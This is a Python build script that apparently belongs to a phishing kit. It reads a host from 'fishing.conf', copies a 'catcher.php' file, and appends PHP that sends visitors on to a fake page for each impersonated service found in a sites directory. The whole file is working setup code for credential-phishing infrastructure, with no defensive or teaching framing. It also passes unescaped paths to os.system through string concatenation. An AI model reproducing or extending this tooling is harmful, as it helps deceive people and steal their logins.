import sys
from os.path import abspath,basename,join,walk,dirname,exists
from os import listdir,system

CurrentDirectory = dirname(abspath(sys.argv[0]))
SitesDirectory   = abspath(join(CurrentDirectory,"../sites"))
ResultDirectory  = abspath(join(CurrentDirectory,"../result"))
ConfigFile       = abspath(join(CurrentDirectory,"../fishing.conf"))
PHPscript        = join(CurrentDirectory,"catcher.php")

Host = ""
f = open(ConfigFile,"r")
while(Host == ""):
    l = f.readline()
    if l[0:5] == "Host=":
        Host = l[5:-1]
    elif l == "":
        Host = "http://localhost/"
f.close()

Services = [o for o in listdir(SitesDirectory) if exists(join(SitesDirectory,o,"script.py"))]

system("mkdir -p " +ResultDirectory)
system("cp -f " + PHPscript + " " + join(ResultDirectory,"catcher.php"))

f = open(join(ResultDirectory,"catcher.php"),"a");
f.write("$Host=\"" + Host +"\";\n")
f.write("$service = substr($res4,strlen($Host));\n")
f.write("$service = substr($service,0,strpos($service,\"/\"));\n")
f.write("switch ($service){\n")
for service in Services:
    f.write('case "' + service + '":\n')
    f.write('    header("Location: ' + Host + service + '");\n')
    f.write('    die(); break;\n')
f.write('?>')
f.close()
